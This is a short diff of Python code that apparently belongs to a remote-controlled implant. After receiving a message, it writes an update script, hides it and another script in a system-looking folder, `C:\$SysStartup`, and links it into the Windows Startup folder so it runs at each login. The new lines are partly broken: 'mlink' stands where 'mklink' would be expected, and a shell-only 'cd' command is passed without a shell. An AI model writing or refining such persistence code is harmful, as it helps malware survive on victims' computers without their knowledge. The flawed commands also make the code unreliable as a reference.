@@ -98,7 +98,8 @@ def process(message):
         call(["move", "pslib.pyw", "C:\\$SysStartup"], shell=True)
         with open("update.pyw", "w") as updateFile:
             updateFile.write(var)
-        call(f'move update.pyw "C:/Users/{getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"', shell=True)
+        call(["move", "update.pyw", "C:\\$SysStartup"], shell=True)
+        call(["cd", f"\"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"", "&&", "mlink", "update.pyw", "C:\\$SysStartup\\update.pyw"])
         recvMsg()
 
     else:
